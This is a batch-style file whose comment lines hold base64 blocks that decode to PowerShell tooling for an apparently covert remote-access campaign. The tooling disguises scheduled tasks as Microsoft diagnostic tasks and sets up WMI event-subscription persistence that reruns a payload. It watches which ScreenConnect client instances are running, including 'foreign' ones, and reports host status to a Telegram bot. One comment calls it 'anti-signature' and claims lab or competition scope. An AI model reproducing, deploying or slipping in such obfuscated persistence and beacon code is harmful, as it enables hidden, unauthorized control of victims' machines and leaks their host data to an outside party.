::DQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2Rl
::PiQoRXNjICRXb3JrRGlyKTwvY29kZT4NCg0KPGI+Q2FtcGFpZ24gc3RhdGU8L2I+
::DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPg0KDQo8aT5Cb3Q6IEBu
::b2J1ZGR5cm1tQm90IHwgVEdfUkVQT1JUIFQ3PC9pPg0KIkANCg0KIyBjb21wYWN0
::IGRpZ2VzdCBtb2RlOiBvbmUgc2hvcnQgbGluZSwgSFRNTC1mcmVlIChob3VybHkg
::aGVhcnRiZWF0KQ0KaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsNCiAgICAkZm9y
::ZWlnbk4gPSAwDQogICAgaWYgKCRzdGF0ZU9iaiAtYW5kICRzdGF0ZU9iai5mb3Jl
::aWduKSB7ICRmb3JlaWduTiA9IEAoJHN0YXRlT2JqLmZvcmVpZ24pLkNvdW50IH0N
::CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNoZSkgeyAnezA6
::TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlKS5MZW5ndGggLyAxS0IpIH0g
::ZWxzZSB7ICcwJyB9DQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdP
::SycgfSBlbHNlIHsgJ0RPV04nIH0NCiAgICAkYWx0U2hvcnQgPSBpZiAoJGFsdExp
::bmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0gZWxzZSB7ICctJyB9DQogICAg
::JHRleHQgPSAiJGVtb2ppIFNDRHwkKCRlbnY6Q09NUFVURVJOQU1FKXxwcmltPSRw
::cmltU2hvcnR8YWx0PSRhbHRTaG9ydHxmb3JlaWduPSRmb3JlaWduTnx0YXNrcz0k
::dGFza09rLzV8bXNpPSRtc2lTaG9ydHx1cD0kdXB0aW1lfGI9JEJ1aWxkfCRub3ci
::DQp9DQoNCmlmICgkdGV4dC5MZW5ndGggLWd0IDM4MDApIHsNCiAgICAkcm1tSGl0
::cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
::LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQ0KICAg
::ICRzY0xpc3QgPSBAKCgkc2NMaXN0IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTQp
::KSArICgnLSAuLi4gKHswfSBtb3JlKScgLWYgKCRzY0xpc3QuQ291bnQgLSAxNCkp
::DQogICAgJHRleHQgPSAkdGV4dC5TdWJzdHJpbmcoMCwgMzgwMCkgKyAiYG5gbjxp
::PlRSVU5DQVRFRCAoVGVsZWdyYW0gNDA5NiBsaW1pdCk8L2k+Ig0KfQ0KDQokbG9n
::ID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicNCmZ1bmN0aW9uIFNlbmQt
::VGcoW3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7DQogICAgJHBheWxvYWQg
::PSBAew0KICAgICAgICBjaGF0X2lkICAgICAgICAgICAgICAgICAgPSAkY2ZnLkNI
::QVRfSUQNCiAgICAgICAgdGV4dCAgICAgICAgICAgICAgICAgICAgID0gJG1zZw0K
::ICAgICAgICBkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXcgPSAkdHJ1ZQ0KICAgIH0N
::CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2RlIH0N
::CiAgICAkanNvbiA9ICRwYXlsb2FkIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNz
::IC1EZXB0aCA1DQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6
::VVRGOC5HZXRCeXRlcygkanNvbikNCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJp
::ICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoJGNmZy5CT1RfVE9LRU4p
::L3NlbmRNZXNzYWdlIikgYA0KICAgICAgICAtTWV0aG9kIFBvc3QgLUJvZHkgJGJ5
::dGVzIC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYt
::OCcgfCBPdXQtTnVsbA0KfQ0KDQpmdW5jdGlvbiBTZW5kLVRnU2FmZShbc3RyaW5n
::XSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkdG9TZW5kID0gJG1zZw0KICAg
::IHRyeSB7DQogICAgICAgIFNlbmQtVGcgLW1zZyAkdG9TZW5kIC1tb2RlICRtb2Rl
::DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0
::cnkgew0KICAgICAgICAgICAgU2VuZC1UZyAtbXNnICgkdG9TZW5kLlN1YnN0cmlu
::ZygwLCAzMDAwKSArICJgbjxpPlRSVU5DQVRFRDwvaT4iKSAtbW9kZSAkbW9kZQ0K
::ICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAgIH0gY2F0Y2ggew0KICAg
::ICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQp0
::cnkgew0KICAgIGlmIChTZW5kLVRnU2FmZSAtbXNnICR0ZXh0IC1tb2RlICdIVE1M
::Jykgew0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
::dWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICB9IGVsc2UgeyB0aHJvdyAnaHRtbF9mYWlsZWQnIH0NCiAgICBpZiAoJGtl
::eSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQ
::YXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1F
::cnJvckFjdGlvbiBTaWxlbHRseUNvbnRpbnVlDQogICAgICAgIFNldC1Db250ZW50
::IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lfdGcuZmxh
::ZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFjdGlvbiBT
::aWxlbHRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5IHsNCiAg
::ICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxbXj5dKz4n
::LCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06
::Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxlbmd0aCAt
::Z3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1MDApICsg
::ImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBsYWlu
::IC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBBZGQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIgKyAkXy5F
::eGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDJMMQ0KIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFudGkt
::c2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQojIChtdXR1YWwgcGVyc2lzdGVuY2Ug
::Y2hhaW4pLCBjYW1wYWlnbiBzdGF0ZSBmaWxlLg0KIyBBdXRob3JpemVkIGludGVy
::bmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCiMg
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::DQpbQ21kbGV0QmluZGluZygpXQ0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5k
::YXRvcnkgPSAkdHJ1ZSldDQogICAgW1ZhbGlkYXRlU2V0KCdpbml0JywgJ3dhdGNo
::ZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScpXQ0K
::ICAgIFtzdHJpbmddJEFjdGlvbiwNCiAgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6
::XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hl
::JywNCiAgICBbc3RyaW5nXSRNb25QYXRoID0gJycsDQogICAgW3N0cmluZ10kQnVp
::bGQgID0gJ08xNScsDQogICAgW3N0cmluZ10kRXh0cmEgID0gJycNCikNCg0KJEVy
::cm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJGNmZ1Bh
::dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycNCg0KIyBMZWdp
::dC1sb29raW5nIHRhc2stbmFtZSBwb29sczsgcGVyLWhvc3QgaGFzaCBwaWNrcyBv
::bmUgcGVyIHNsb3QuDQokUG9vbHMgPSBAew0KICAgIEEgPSBAKCdcTWljcm9zb2Z0
::XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcsJ1xNaWNyb3NvZnRcV2luZG93
::c1xEaWFnbm9zaXNcQlZUQ29uc3VtZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0
::VHJhY2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJ
::XFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIg
::RGlhZ25vc3RpY3MnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlza0RpYWdub3N0aWNc
::UmVzb2x2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcTWVtb3J5RGlhZ25vc3RpY1xD
::b3JydXB0aW9uRGV0ZWN0b3InLCdcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXIgRWZm
::aWNpZW5jeSBEaWFnbm9zdGljc1xBbmFseXplU3lzdGVtJykNCiAgICBCID0gQCgn
::XE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRv
::d3NcV0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdu
::b3Npc1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxH
::YXRoZXJOZXR3b3JrSW5mbycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNc
::U2NoZWR1bGVkJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpc2tEaWFnbm9zdGljXFJl
::c29sdmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXE1lbW9yeURpYWdub3N0aWNcQ29y
::cnVwdGlvblZlcmlmaWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFd3YW5TdmNcTm90
::aWZpY2F0aW9uJykNCiAgICBDID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxS
::ZXNvbHV0aW9uSG9zdCcsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRo
::ZXJOZXR3b3JrSW5mbycsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJl
::c3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENv
::bnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9z
::b2Z0XFdpbmRvd3NcV3dhblN2Y1xOb3RpZmljYXRpb24nLCdcTWljcm9zb2Z0XFdp
::bmRvd3NcRGlza0RpYWdub3N0aWNcUmVzb2x2ZXInLCdcTWljcm9zb2Z0XFdpbmRv
::d3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcpDQogICAgRCA9IEAoJ1xNaWNyb3NvZnRc
::V2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdp
::bmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5l
::dFRyYWNlXEdhdGhlck5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFd3
::YW5TdmNcTm90aWZpY2F0aW9uJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Np
::c1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyJywn
::XE1pY3Jvc29mdFxXaW5kb3dzXERpc2tEaWFnbm9zdGljXFJlc29sdmVyJywnXE1p
::Y3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnKQ0KfQ0KJERlZmF1
::bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnXE1pY3Jvc29mdFxXaW5k
::b3dzXERpYWdub3Npc1xTY2hlZHVsZWQnDQogICAgVEFTS19CID0gJ1xNaWNyb3Nv
::ZnRcV2luZG93c1xQTEFcU2VydmVyJw0KICAgIFRBU0tfQyA9ICdcTWljcm9zb2Z0
::XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0Jw0KICAgIFRBU0tfRCA9ICdcTWlj
::cm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxJw0KICAgIE1P
::X0EgICA9ICcyJw0KICAgIE1PX0IgICA9ICczJw0KfQ0KDQpmdW5jdGlvbiBHZXQt
::SG9zdFNlZWQgew0KICAgICRzID0gMEwNCiAgICBmb3JlYWNoICgkYyBpbiAkZW52
::OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgk
::cyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAwMDA3IH0NCiAgICByZXR1cm4gJHMN
::Cn0NCg0KZnVuY3Rpb24gUmVhZC1JZGVudGl0eSB7DQogICAgJGlkID0gJERlZmF1
::bHRzLkNsb25lKCkNCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7DQogICAg
::ICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
::JGNmZ1BhdGgpKSB7DQogICAgICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMq
::KFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkWyRtYXRjaGVzWzFdXSA9
::ICRtYXRjaGVzWzJdIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGlk
::DQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0KICAgICMgSWRl
::bXBvdGVudDogaWRlbnRpdHkgbXVzdCBuZXZlciBjaGFuZ2Ugb25jZSB3cml0dGVu
::ICh0YXNrcyBkZXBlbmQgb24gaXQpLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1Bh
::dGgpIHsgcmV0dXJuIChSZWFkLUlkZW50aXR5KSB9DQogICAgJHMgPSBHZXQtSG9z
::dFNlZWQNCiAgICAkY2ZnID0gQCgNCiAgICAgICAgIlRBU0tfQT0kKCRQb29scy5B
::WyRzICUgOF0pIg0KICAgICAgICAiVEFTS19CPSQoJFBvb2xzLkJbKCRzICsgMykg
::JSA4XSkiDQogICAgICAgICJUQVNLX0M9JCgkUG9vbHMuQ1soJHMgKyA1KSAlIDhd
::KSINCiAgICAgICAgIlRBU0tfRD0kKCRQb29scy5EWygkcyArIDcpICUgOF0pIg0K
::ICAgICAgICAiTU9fQT0kKDIgKyAoJHMgJSA0KSkiICAgICAgICAgICMgMi01IG1p
::biBqaXR0ZXINCiAgICAgICAgIk1PX0I9JCgzICsgKCgkcyArIDEpICUgMykpIiAg
::ICAjIDMtNSBtaW4gaml0dGVyDQogICAgICAgICJTRUVEPSRzIg0KICAgICkNCiAg
::ICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLVZhbHVlICRjZmcg
::LUZvcmNlDQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQ0KfQ0KDQpmdW5jdGlv
::biBJbnN0YWxsLVdhdGNoZG9nIHsNCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyBy
::ZXR1cm4gJGZhbHNlIH0NCiAgICAkb2sgPSAkdHJ1ZQ0KICAgIHRyeSB7DQogICAg
::ICAgIFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9u
::IC1DbGFzcyBfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiBgDQogICAgICAgICAg
::ICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50
::ZXJ2YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxz
::ZSB9IHwgT3V0LU51bGwNCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5h
::bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBg
::DQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNo
::ZG9nRic7IEV2ZW50TmFtZXNwYWNlID0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1
::YWdlID0gJ1dRTCc7DQogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0g
::IlNFTEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2Fj
::aGVXYXRjaGRvZyciIH0NCiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5h
::bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVu
::dENvbnN1bWVyIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdX
::dWNhY2hlV2F0Y2hkb2dDJzsgQ29tbWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQuZXhl
::IC9jIGAiJE1vblBhdGhgIiI7IFJ1bkludGVyYWN0aXZlbHkgPSAkZmFsc2UgfQ0K
::ICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlw
::dGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgDQogICAgICAg
::ICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0g
::fCBPdXQtTnVsbA0KICAgIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQ0KICAgIHJl
::dHVybiAkb2sNCn0NCg0KZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsNCiAgICAk
::YyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
::Q2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1
::Y2FjaGVXYXRjaGRvZ0MnIg0KICAgIGlmICgkbnVsbCAtZXEgJGMpIHsNCiAgICAg
::ICAgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsDQogICAgICAgIHJldHVybiAn
::UkVBUk1FRCcNCiAgICB9DQogICAgcmV0dXJuICdPSycNCn0NCg0KZnVuY3Rpb24g
::VXBkYXRlLVN0YXRlIHsNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwN
::CiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVu
::Q29ubmVjdCBDbGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0
::Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAgICAgIGlmICgkbWF0
::Y2hlc1sxXSAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2
::Yy5TdGF0dXMpIiB9DQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1l
::cSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIg
::fQ0KICAgICAgICB9DQogICAgfQ0KICAgICRmb3JlaWduID0gQCgpDQogICAgZm9y
::ZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50KicpKSB7DQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChb
::MC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluIEAoJzVmNjAx
::MDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JykpIHsNCiAgICAgICAgICAg
::ICRmb3JlaWduICs9ICRtYXRjaGVzWzFdDQogICAgICAgIH0NCiAgICB9DQogICAg
::JGlkID0gUmVhZC1JZGVudGl0eQ0KICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90
::YWwgPSAwDQogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RB
::U0tfQycsJ1RBU0tfRCcpIHsNCiAgICAgICAgJHRhc2tzVG90YWwrKw0KICAgICAg
::ICAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICRpZFska10gMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgIGlmICgkTEFTVEVYSVRDT0RFIC1lcSAwKSB7ICR0YXNrc09r
::KysgfQ0KICAgIH0NCiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cNCiAgICAkcHJl
::diA9IEB7fQ0KICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0
::YXRlLmpzb24nDQogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7DQogICAg
::ICAgIHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAt
::UmF3IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZv
::ckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0
::Y2gge30NCiAgICB9DQogICAgJGluc3RhbGxDb3VudCA9IDENCiAgICBpZiAoJHBy
::ZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmlu
::c3RhbGxDb3VudCB9DQogICAgaWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5wcmlt
::IC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRpbnN0
::YWxsQ291bnQrKyB9DQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsNCiAgICAgICAg
::aG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUNCiAgICAgICAgdHMgICAg
::ICAgICAgID0gKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygn
::bycpDQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZA0KICAgICAgICBwcmlt
::ICAgICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lO
::RycgfSkNCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAkYWx0
::IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBmb3JlaWduICAgICAgPSAk
::Zm9yZWlnbg0KICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NPaw0KICAgICAg
::ICB0YXNrc1RvdGFsICAgPSAkdGFza3NUb3RhbA0KICAgICAgICB3YXRjaGRvZyAg
::ICAgPSAkd2QNCiAgICAgICAgaW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudA0K
::ICAgICAgICBsYXN0SGVhbCAgICAgPSAkKGlmICgkRXh0cmEpIHsgKEdldC1EYXRl
::KS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygjbycpIH0gZWxzZWlmICgkcHJl
::di5sYXN0SGVhbCkgeyAkcHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVsbCB9KQ0K
::ICAgICAgICBub3RlICAgICAgICAgPSAkRXh0cmENCiAgICB9DQogICAgKCRzdGF0
::ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcykgfCBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggJHN0YXRlUGF0aCAtRm9yY2UNCiAgICByZXR1cm4gJHN0YXRlDQp9
::DQoNCnN3aXRjaCAoJEFjdGlvbikgew0KICAgICdpbml0JyAgICAgICAgICAgIHsg
::JGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8
::IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9DQog
::ICAgJ2lkZW50aXR5JyAgICAgICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQu
::R2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQo
::JF8uVmFsdWUpIiB9IH0NCiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwt
::V2F0Y2hkb2cgfCBPdXQtTnVsbCB9DQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBF
::bnN1cmUtV2F0Y2hkb2cgfQ0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRl
::LVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0NCn0NCg==
::B64_LIB_END